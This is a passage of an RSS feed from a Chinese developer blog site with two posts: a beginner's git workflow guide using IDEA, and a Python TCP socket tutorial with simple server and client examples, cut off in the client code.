<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>git操作实战指南 - 布尔bl</title>
<link>http://www.cnblogs.com/chenzhuantou/p/10903544.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenzhuantou/p/10903544.html</guid>
<description>&lt;p&gt;小白进入公司，进入日常多人开发，git的使用应该是新人要掌握的第一个技能。git是一个分布式数据存储库，分为远程存储和本地存储，本地存储的话，每一台计算机就相当于一个存储数据库，可以记录和存储代码&lt;/p&gt;

&lt;p&gt;本文以IDEA的git工具操作为例，结合日常开发，讲解如何git开发。&lt;/p&gt;
&lt;h2 id=&quot;情景1&quot;&gt;2.1 情景1&lt;/h2&gt;
&lt;p&gt;小白进入公司后，上司对他说，今天数据一下代码哦。&lt;/p&gt;
&lt;p&gt;小白说我就不（内心活动） 默默打开git图形操作界面， 克隆代码（真香操作）···&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpFX1U.png&quot; alt=&quot;VpFX1U.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后打开idea导入项目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpkEcD.png&quot; alt=&quot;VpkEcD.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在框图中可以看到目前小白在&lt;span&gt;master分支&lt;/span&gt; 该分支一般是公司正式上线的分支，存储着正式上线的代码，因此小白接下来的一天就可以熟悉代码了(俗称摸鱼)。熟悉代码对开发着来说很重要，这是开发者的业务熟悉程度的具体表现，熟悉了代码以后写代码也方便，当然作为小白阅读别人的代码也可以学习其他的优秀的代码编写，学习借鉴。&lt;/p&gt;
&lt;h3 id=&quot;情景2&quot;&gt;2.2 情景2&lt;/h3&gt;
&lt;p&gt;新的一天开始了 小白有来到公司 上司对他说写个小需求吧&lt;/p&gt;
&lt;p&gt;小白说我就不，默默打开IDEA(真香操作)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpASxS.png&quot; alt=&quot;VpASxS.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;1.点击master分支，弹出窗口&lt;/p&gt;
&lt;p&gt;2.点击new branch， 新建分支&lt;/p&gt;
&lt;p&gt;3.命名为：日期+功能&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpAe2T.png&quot; alt=&quot;VpAe2T.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;效果图如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpAmxU.png&quot; alt=&quot;VpAmxU.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;说明:&lt;/span&gt;一定在mater分支，在最新的状态创建新的本地分支，为了确保是最新状态，一般点击&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpAlZ9.png&quot; alt=&quot;VpAlZ9.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;18年以上的版本才有。&lt;/p&gt;
&lt;p&gt;然后小白就可以愉快的码代码了（不是摸鱼的一天）&lt;/p&gt;
&lt;h3 id=&quot;情景3&quot;&gt;2.3 情景3&lt;/h3&gt;
&lt;p&gt;小白完成代码编写了&lt;/p&gt;
&lt;p&gt;这时候， 小白应该在本地分支commit代码，将代码存进暂存区，暂存区相当于本地仓库与远程仓库的中转站，在暂存区的代码可以扔掉&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpAlZ9.png&quot; alt=&quot;VpAlZ9.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当idea提示完成后，就可以愉快切换分支了，此时要切换到test分支，test分支一般是公司的测试分支，用于测试工程师测试，代码经过测试开发者测试通过后，带可以将自己的代码merge（合并）到master分支&lt;/p&gt;
&lt;p&gt;前面如果没有commit代码，就切换分支的话，会本地分支代码带到切换的分支，造成不必要的麻烦，影响合并操作，应当注意。&lt;/p&gt;
&lt;p&gt;切换到新分支后，就可以合并代码了，将新建分支的代码合并到test分支，部署上线到测试环境。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpVeuF.png&quot; alt=&quot;VpVeuF.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后就可以push代码了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/VpVMNR.png&quot; alt=&quot;VpVMNR.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;情景4&quot;&gt;2.4 情景4&lt;/h3&gt;
&lt;p&gt;测试告诉小白，测试通过&lt;/p&gt;
&lt;p&gt;这时候，小白就可以切换到master分支，将自己新建的分支代码合并到master分支，操作参考在test分支合并新分支代码&lt;/p&gt;

&lt;p&gt;1.写代码一定在新分支或者自己的分支写，所以写代码之前要检查项目分支在哪里，不要在master或者test分支或者别人的分支写代码，影响代码合并&lt;/p&gt;
&lt;p&gt;2.基于上一条，所以要胆大心细。&lt;/p&gt;
</description>
<pubDate>Tue, 21 May 2019 17:01:00 +0000</pubDate>
<dc:creator>布尔bl</dc:creator>
<og:description>1 背景 小白进入公司，进入日常多人开发，git的使用应该是新人要掌握的第一个技能。git是一个分布式数据存储库，分为远程存储和本地存储，本地存储的话，每一台计算机就相当于一个存储数据库，可以记录和存</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chenzhuantou/p/10903544.html</dc:identifier>
</item>
<item>
<title>python网络-Socket之TCP编程(26) - Se7eN_HOU</title>
<link>http://www.cnblogs.com/Se7eN-HOU/p/10903528.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Se7eN-HOU/p/10903528.html</guid>
<description>&lt;h3&gt;&lt;span&gt;一、TCP简介&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;tcp介绍&quot;&gt;&lt;strong&gt;1、TCP介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCP协议，传输控制协议（英语：Transmission Control Protocol，缩写为 TCP）&lt;/strong&gt;是一种面向连接的、可靠的、基于字节流的传输层通信协议。&lt;/p&gt;
&lt;p&gt;TCP通信需要经过&lt;strong&gt;创建连接、数据传送、终止连接&lt;/strong&gt;三个步骤。&lt;/p&gt;
&lt;p&gt;TCP通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，&quot;打电话&quot;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、TCP面向连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通信双方必须先建立连接才能进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输。&lt;/p&gt;
&lt;p&gt;双方间的数据传输都可以通过这一个连接进行。&lt;/p&gt;
&lt;p&gt;完成数据交换后，双方必须断开此连接，以释放系统资源。&lt;/p&gt;
&lt;p&gt;这种连接是一对一的，因此TCP不适用于广播的应用程序，基于广播的应用程序请使用UDP协议。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、TCP可靠传输&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1）TCP采用发送应答机制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TCP发送的每个报文段都必须得到接收方的应答才认为这个TCP报文段传输成功&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2）超时重传&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;发送端发出一个报文段之后就启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（&lt;strong&gt;ACK&lt;/strong&gt;）；如果发送端实体在合理的往返时延（&lt;strong&gt;RTT&lt;/strong&gt;）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3）错误校验&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。&lt;/p&gt;
&lt;p&gt;4) &lt;strong&gt;流量控制和阻塞管理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;流量控制用来避免主机发送得过快而使接收方来不及完全收下。&lt;/p&gt;
&lt;p id=&quot;tcp与udp的不同点&quot;&gt;&lt;strong&gt;4、TCP与UDP的不同点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;面向连接（确认有创建三方交握，连接已创建才作传输。）&lt;/li&gt;
&lt;li&gt;有序数据传输&lt;/li&gt;
&lt;li&gt;重发丢失的数据包&lt;/li&gt;
&lt;li&gt;舍弃重复的数据包&lt;/li&gt;
&lt;li&gt;无差错的数据传输&lt;/li&gt;
&lt;li&gt;阻塞/流量控制&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;二、TCP数据包格式&lt;/h3&gt;
&lt;p&gt;所谓三次握手(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送&lt;strong&gt;3个数据包&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;那么我们就先来看一下TCP数据包的格式：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190521221208034-1552077227.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
在TCP层，有个FLAGS字段，这个字段有以下几个标识：&lt;strong&gt;SYN, FIN, ACK, PSH, RST, URG.&lt;/strong&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;URG—为&lt;span class=&quot;s2&quot;&gt;1表示高优先级数据包&lt;span class=&quot;s2&quot;&gt;，紧急指针字段有效。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;ACK—&lt;span class=&quot;s1&quot;&gt;为1&lt;span class=&quot;s1&quot;&gt;表示确认号字段有效&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;PSH—为&lt;span class=&quot;s2&quot;&gt;1表示是带有&lt;span class=&quot;s2&quot;&gt;PUSH标志的数据&lt;span class=&quot;s2&quot;&gt;，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;RST—为&lt;span class=&quot;s2&quot;&gt;1表示出现严重差错。可能需要重现创建&lt;span class=&quot;s2&quot;&gt;TCP连接。还可以用于拒绝非法的报文段和拒绝连接请求。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;SYN—为&lt;span class=&quot;s2&quot;&gt;1表示这是连接请求或是连接接受请求&lt;span class=&quot;s2&quot;&gt;，用于创建连接和使顺序号同步&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;FIN—为&lt;span class=&quot;s2&quot;&gt;1表示发送方没有数据要传输了&lt;span class=&quot;s2&quot;&gt;，要求释放连接&lt;/span&gt;&lt;/span&gt;，&lt;/li&gt;
&lt;li&gt;Seq---序号，这是为了连接以后传送数据用的，&lt;/li&gt;
&lt;li&gt;Ack---确认号对收到的数据包的确认，值是等待接收的数据包的序列号+1。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;strong&gt;三、TCP的三次握手&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息.在socket编程中，客户端执行connect()时。将触发三次握手。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三次握手示意图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190522005401027-1217776249.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一次握手:（Client向Server发送联机请求）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SYN=1（Client向Server发送联机请求）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Client想要与Server进行TCP通信,首先他需要向Server发送一个&lt;strong&gt;SYN=1的同步序列编号(syncsynchronized squsequence number)用来表示建立连接&lt;/strong&gt;,并且随机产生一个数Seq number = X的数据包到Server，Server由于SYN=1知道，Client要求建立联机，到这里第一次握手就结束了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二次握手:（Server向Client回复联机并确认联机信息）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SYN=1（Server接受Client的联机请求）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ACK=1(确认信息)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是对第一次握手信息的确认，表示Server收到了Client的第一次握手信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ack=X+1(确认回复)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同时Server回复Client一个确认码&lt;strong&gt;Ack&lt;/strong&gt;表示你的联机请求我已经收到，而且数据没有丢失，怎么验证数据没有丢失呢？即Ack的值等于Client发过来Seq的值加1，即&lt;strong&gt;Ack = X+1&lt;/strong&gt;。因为我都知道你发过来的Seq的值，所以这个数据包没有丢失。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Seq = Y（第二次握手的数据包序列号）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Server给Client的数据包序列号，为了数据包在到达Client之后的验证，所以这次从Server到Client的数据包中同样也会随机产生一个Seq number = Y，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三次握手&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ACK=1（对第二次握手的确认）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先Client会打开Server发送过来的&lt;strong&gt;Ack&lt;/strong&gt;验证一下是否正确为Seq+1，即第一次发送的seq number+1，确认无误后，Client仍然需要给Server再次回复确认即&lt;strong&gt;ACK=1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Seq=Z（第三次握手的数据包序列号）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ack=Y+1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Client告诉Server，你给我回复的信息我也收到了，怎么确定我收到了你的信息呢？就是通过Ack等于第二次握手传递过来的Seq值+1。到此为止三次握手结束进入ESTABLISHED状态,开始进行数据传输。&lt;/p&gt;

&lt;h3&gt;四、TCP四次挥手&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190522001208456-1420895420.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/p&gt;

&lt;p&gt;第一次挥手发送FIN请求,第一次挥手结束。&lt;/p&gt;
&lt;p&gt;第二次挥手开始,被动方向主动方发送ACK确认码,到这里第二次挥手结束。&lt;/p&gt;
&lt;p&gt;第三次握手开始被动方向主动方发送FIN号结束。&lt;/p&gt;
&lt;p&gt;第四次挥手开始主动方向被动方发送ACK确认,等待&lt;strong&gt;2MSL&lt;/strong&gt;后断开TCP连接。&lt;/p&gt;

&lt;h3&gt;五、TCP的十种状态&lt;/h3&gt;
&lt;p&gt;这十种状态分别是三次握手和四次挥手中的状态，在上面两个图中都给大家标记出来了，这里再给大家一个简单的图表示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190522002231005-2034194535.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;六、TCP的2MSL问题&lt;/h3&gt;
&lt;p&gt;在四次挥手中我们提到了时间等待状态，等待的时间是2MSL。&lt;/p&gt;
&lt;p&gt;2MSL即两倍的MSL，TCP的TIME_WAIT状态也称为2MSL等待状态，&lt;/p&gt;
&lt;p&gt;当TCP的一端发起主动关闭，在发出最后一个ACK包后，即第3次挥手完成后发送了第四次挥手的ACK包后就进入了&lt;strong&gt;TIME_WAIT&lt;/strong&gt;状态，必须在此状态上停留&lt;strong&gt;两倍的MSL&lt;/strong&gt;时间，等待2MSL时间主要目的是怕最后一个 ACK包对方没收到，那么对方在超时后将重发第三次挥手的FIN包，主动关闭端接到重发的FIN包后可以再发一个ACK应答包。在&lt;strong&gt;TIME_WAIT&lt;/strong&gt;状态时两端的端口不能使用，要等到2MSL时间结束才可继续使用。当连接处于2MSL等待阶段时任何迟到的报文段都将被丢弃。不过在实际应用中可以通过设置 SO_REUSEADDR选项达到不必等待2MSL时间结束再使用此端口。&lt;/p&gt;

&lt;h3&gt;七、TCP长连接和短连接&lt;/h3&gt;
&lt;p&gt;TCP在真正的读写操作之前，server与client之间必须建立一个连接，&lt;/p&gt;
&lt;p&gt;当读写操作完成后，双方不再需要这个连接时它们可以释放这个连接，&lt;/p&gt;
&lt;p&gt;连接的建立通过三次握手，释放则需要四次握手，&lt;/p&gt;
&lt;p&gt;所以说每个连接的建立都是需要资源消耗和时间消耗的。&lt;/p&gt;
&lt;p id=&quot;1-tcp短连接&quot;&gt;&lt;strong&gt;1. TCP短连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;模拟一种TCP短连接的情况:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;client 向 server 发起连接请求&lt;/li&gt;
&lt;li&gt;server 接到请求，双方建立连接&lt;/li&gt;
&lt;li&gt;client 向 server 发送消息&lt;/li&gt;
&lt;li&gt;server 回应 client&lt;/li&gt;
&lt;li&gt;一次读写完成，此时双方任何一个都可以发起 close 操作&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;在第 步骤5中，一般都是 client 先发起 close 操作。当然也不排除有特殊的情况。从上面的描述看，短连接一般只会在 client/server 间传递一次读写操作！&lt;/p&gt;
&lt;p id=&quot;2-tcp长连接&quot;&gt;&lt;strong&gt;2. TCP长连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;再模拟一种长连接的情况:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;client 向 server 发起连接&lt;/li&gt;
&lt;li&gt;server 接到请求，双方建立连接&lt;/li&gt;
&lt;li&gt;client 向 server 发送消息&lt;/li&gt;
&lt;li&gt;server 回应 client&lt;/li&gt;
&lt;li&gt;一次读写完成，连接不关闭&lt;/li&gt;
&lt;li&gt;后续读写操作...&lt;/li&gt;
&lt;li&gt;长时间操作之后client发起关闭请求&lt;/li&gt;
&lt;/ol&gt;&lt;p id=&quot;3-tcp长短连接操作过程&quot;&gt;&lt;strong&gt;3. TCP长/短连接操作过程&lt;/strong&gt;&lt;/p&gt;
&lt;p id=&quot;31-短连接的操作步骤是：&quot;&gt;&lt;strong&gt;（1）短连接的操作步骤是：&lt;/strong&gt;&lt;strong&gt;建立连接——数据传输——关闭连接...建立连接——数据传输——关闭连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190522003926350-2142470600.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p id=&quot;32-长连接的操作步骤是：&quot;&gt;&lt;strong&gt;（2） 长连接的操作步骤是：建立连接——数据传输...（保持连接）...数据传输——关闭连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190522004057902-1573841679.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p id=&quot;4-tcp长短连接的优点和缺点&quot;&gt;&lt;strong&gt;4. TCP长/短连接的优点和缺点&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;client与server之间的连接如果一直不关闭的话，会存在一个问题，随着客户端连接越来越多，server早晚有扛不住的时候，这时候server端需要采取一些策略，如关闭一些长时间没有读写事件发生的连接，这样可以避免一些恶意连接导致server端服务受损；如果条件再允许就可以以客户端机器为颗粒度，限制每个客户端的最大长连接数，这样可以完全避免某个蛋疼的客户端连累后端服务。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;短连接对于服务器来说管理较为简单，存在的连接都是有用的连接，不需要额外的控制手段。但如果客户请求频繁，将在TCP的建立和关闭操作上浪费时间和带宽。&lt;/li&gt;
&lt;/ul&gt;&lt;p id=&quot;5-tcp长短连接的应用场景&quot;&gt;&lt;strong&gt;5. TCP长/短连接的应用场景&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;长连接多用于操作频繁，点对点的通讯，而且连接数不能太多情况。每个TCP连接都需要三次握手，这需要时间，如果每个操作都是先连接，再操作的话那么处理速度会降低很多，所以每个操作完后都不断开，再次处理时直接发送数据包就OK了，不用建立TCP连接。&lt;/p&gt;
&lt;p&gt;例如：数据库的连接用长连接，如果用短连接频繁的通信会造成socket错误，而且频繁的socket 创建也是对资源的浪费。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;而像WEB网站的http服务一般都用短链接，因为长连接对于服务端来说会耗费一定的资源，而像WEB网站这么频繁的成千上万甚至上亿客户端的连接用短连接会更省一些资源，如果用长连接，而且同时有成千上万的用户，如果每个用户都占用一个连接的话，那可想而知吧。所以并发量大，但每个用户无需频繁操作情况下需用短连好。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;八、TCP的通信模型&lt;/h3&gt;
&lt;p&gt;tcp通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，&quot;打电话&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190521142443211-68370154.png&quot; alt=&quot;&quot; width=&quot;400&quot;/&gt;&lt;/p&gt;
&lt;p id=&quot;生活中的电话机&quot;&gt;生活中的电话机，如果想让别人能更够打通咱们的电话获取相应服务的话，需要做一下几件事情：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;买个手机&lt;/li&gt;
&lt;li&gt;插上手机卡&lt;/li&gt;
&lt;li&gt;设计手机为正常接听状态（即能够响铃）&lt;/li&gt;
&lt;li&gt;静静的等着别人拨打&lt;/li&gt;
&lt;/ol&gt;&lt;p id=&quot;tcp服务器&quot;&gt;&lt;strong&gt;tcp服务器如同上面的电话机过程一样，在程序中，如果想要完成一个tcp服务器的功能，需要的流程如下：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;创建一个socket套接字&lt;/li&gt;
&lt;li&gt;bind绑定ip和port&lt;/li&gt;
&lt;li&gt;listen使套接字变为可以被动链接&lt;/li&gt;
&lt;li&gt;accept等待客户端的链接&lt;/li&gt;
&lt;li&gt;recv/send接收发送数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;九、TCP服务器代码实现&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;coding = utf-8&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; socket &lt;span&gt;import&lt;/span&gt; *
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;1、创建socket套接字&lt;/span&gt;
tcpServerSocket =&lt;span&gt; socket(AF_INET,SOCK_STREAM)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;2、绑定本地信息&lt;/span&gt;
address = (&lt;span&gt;&quot;&quot;&lt;/span&gt;,7788&lt;span&gt;)
tcpServerSocket.bind(address)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;3、使用socket创建的套接字默认的属性是主动的，使用listen将其变为被动，这样就可以等着别人链接了&lt;/span&gt;
tcpServerSocket.listen(5&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
如果有新的客户端来链接服务器，那么就产生一个新的套接字专门为这个客户端服务器
newSocket用来为这个客户端服务
tcpServerSocket就可以省下来专门等待其他的客户端的链接
&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
newSocket,clientAddress &lt;/span&gt;=&lt;span&gt; tcpServerSocket.accept()

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;4、接收对象发送过来的数据，最大接收1024个字节&lt;/span&gt;
reveiveData = newSocket.recv(1024&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;接收的数据为：%s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;%&lt;span&gt;reveiveData.decode())

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;5、发送数据到客户端&lt;/span&gt;
&lt;span&gt;newSocket.send(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;haha&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.encode())

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;6、关闭为这个客户端服务的套接字&lt;/span&gt;
&lt;span&gt;newSocket.close()

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;7、关闭监听套接字&lt;/span&gt;
tcpServerSocket.close()
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行流程&lt;/p&gt;
&lt;p&gt;1、TCP服务器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190521151254954-705541182.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2、网络调试助手：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190521151615485-184692887.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;十、TCP客户端代码实现&lt;/h3&gt;
&lt;p&gt;所谓的服务器端：就是提供服务的一方，而客户端，就是需要被服务的一方&lt;/p&gt;
&lt;p&gt;tcp的客户端要比服务器端简单很多，如果说服务器端是需要自己买手机、查手机卡、设置铃声、等待别人打电话流程的话，那么客户端就只需要找一个电话亭，拿起电话拨打即可，流程要少很多&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;coding = utf-8&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; socket &lt;span&gt;import&lt;/span&gt; *

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;1、创建socket&lt;/span&gt;
tcpClientSocket =&lt;span&gt; socket(AF_INET,SOCK_STREAM)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;2、链接服务器&lt;/span&gt;
serverAddress = (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.100.106&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,7788&lt;span&gt;)
tcpClientSocket.connect(serverAddress)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;3、向服务器发送数据&lt;/span&gt;
tcpClientSocket.send(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;哈哈&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;.encode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gb2312&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;4、接收对方发送过来的数据，最大接收1024个字节&lt;/span&gt;
receiveData = tcpClientSocket.recv(1024&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;接收到的数据为%s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;%receiveData.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gb2312&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))

